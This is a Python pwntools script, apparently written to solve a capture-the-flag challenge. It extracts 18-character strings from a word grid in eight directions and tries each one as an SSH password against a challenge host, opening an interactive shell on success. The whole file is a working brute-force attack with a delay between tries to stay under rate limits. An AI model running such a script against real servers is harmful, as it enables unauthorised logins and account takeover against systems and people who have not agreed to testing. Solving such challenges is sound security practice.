from pwn import *
import time

# Define the server and username
server = "password-card-rules.cypherfix.tcc"
username = "futurethinker"
port = 22  # Default SSH port

# Define the grid of characters (your password grid)
password_grid_fixed = [
    "SQUIRELL*JUDGE*NEWS*LESSON",
    "WORRY*UPDATE*SEAFOOD*CROSS",
    "CHAPTER*SPEEDBUMP*CHECKERS",
    "PHONE*HOPE*NOTEBOOK*ORANGE",
    "CARTOONS*CLEAN*TODAY*ENTER",
    "ZEBRA*PATH*VALUABLE*MARINE",
    "VOLUME*REDUCE*LETTUCE*GOAL",
    "BUFFALOS*THE*CATCH*SUPREME",
    "LONG*OCTOPUS*SEASON*SCHEME",
    "CARAVAN*TOBACCO*WORM*XENON",
    "PUPPYLIKE*WHATEVER*POPULAR",
    "SALAD*UNKNOWN*SQUATS*AUDIT",
    "HOUR*NEWBORN*TURN*WORKSHOP",
    "USEFUL*OFFSHORE*TOAST*BOOK",
    "COMPANY*FREQUENCY*NINETEEN",
    "AMOUNT*CREATE*HOUSE*FOREST",
    "BATTERY*GOLDEN*ROOT*WHEELS",
    "SHEEP*HOLIDAY*APPLE*LAWYER",
    "SUMMER*HORSE*WATER*SULPHUR"
]

# Directions: [row_delta, col_delta]
DIRECTIONS = [
    (-1, 0),  # up
    (1, 0),   # down
    (0, -1),  # left
    (0, 1),   # right
    (-1, -1), # up-left
    (-1, 1),  # up-right
    (1, -1),  # down-left
    (1, 1),   # down-right
]

# Function to get a password by going in a direction
def get_password(grid, start_row, start_col, direction, length):
    row, col = start_row, start_col
    password = []
    
    for _ in range(length):
        # Check if we are within the grid bounds
        if row < 0 or row >= len(grid) or col < 0 or col >= len(grid[0]):
            return None  # We went out of bounds
        
        password.append(grid[row][col])
        row += direction[0]
        col += direction[1]
    
    return ''.join(password)

# Function to find all passwords of length 18
def find_passwords_of_length_18(grid, length=18):
    passwords = []
    rows = len(grid)
    cols = len(grid[0])

    for r in range(rows):
        for c in range(cols):
            # Try all directions from each starting point
            for direction in DIRECTIONS:
                password = get_password(grid, r, c, direction, length)
                if password and len(password) == length:
                    passwords.append(password)
    
    return passwords

# Try to SSH using each password
def try_ssh_with_password(password):
    while True:
        try:
            ssh_conn = ssh(user=username, host=server, password=password, port=port, timeout=5)
            
            if ssh_conn.connected():
                print(f"Successful login with password: {password}")
                ssh_conn.interactive()  # Open interactive shell
                return True
            ssh_conn.close()
            break  # Authentication failed, move to next password

        except Exception as e:
            print(str(e))
            if "Authentication failed" in str(e):
                break

        time.sleep(1)  # Avoid rate-limiting


# Main function to find passwords and try SSH
def main():
    passwords_of_length_18 = find_passwords_of_length_18(password_grid_fixed)
    print(f"Found {len(passwords_of_length_18)} passwords of length 18.")

    for password in passwords_of_length_18:
        print(f"Trying password: {password}")
        if try_ssh_with_password(password):
            break  # Stop after successful login

if __name__ == "__main__":
    main()
